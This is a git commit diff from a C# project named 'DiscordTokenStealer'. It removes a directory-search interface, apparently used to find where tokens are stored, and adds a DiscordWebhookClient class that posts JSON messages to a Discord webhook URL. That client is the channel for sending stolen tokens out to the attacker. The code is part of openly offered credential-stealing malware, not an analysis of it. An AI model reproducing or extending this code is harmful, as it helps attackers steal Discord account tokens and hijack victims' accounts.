a85d82d96eb1548d3d46a69a9ecdc9bc370a2bb7
EbicHecker <sxpremecrypt@pm.me>
2022-02-26 22:00:08 +0100

    updatee

--- DirectorySearchProviders/IDirectorySearchProvider.cs
+++
@@ -1,8 +0,0 @@
-﻿namespace DiscordTokenStealer.DirectorySearchProviders;
-
-public interface IDirectorySearchProvider
-{
-    public string Directory { get; }
-    public string Pattern { get; }
-    public bool Exists { get; }
-}
---
+++ Discord/DiscordWebhookClient.cs
@@ -0,0 +1,29 @@
+﻿using System.Net;
+using System.Net.Http.Json;
+
+namespace DiscordTokenStealer.Discord;
+
+public class DiscordWebhookClient : IDisposable
+{
+    private readonly HttpClient _client;
+
+    public DiscordWebhookClient(string id, string token)
+    {
+        _client = new HttpClient(new HttpClientHandler {UseProxy = true, Proxy = new WebProxy()}, true)
+        {
+            BaseAddress = new Uri($"https://canary.discord.com/api/webhooks/{id}/{token}")
+        };
+    }
+
+    public void Dispose()
+    {
+        _client.Dispose();
+        GC.SuppressFinalize(this);
+    }
+
+    public async Task SendMessage<TMessage>(TMessage message) where TMessage : DiscordMessage
+    {
+        using var response = await _client.PostAsync(string.Empty, JsonContent.Create(message));
+        response.EnsureSuccessStatusCode();
+    }
+}
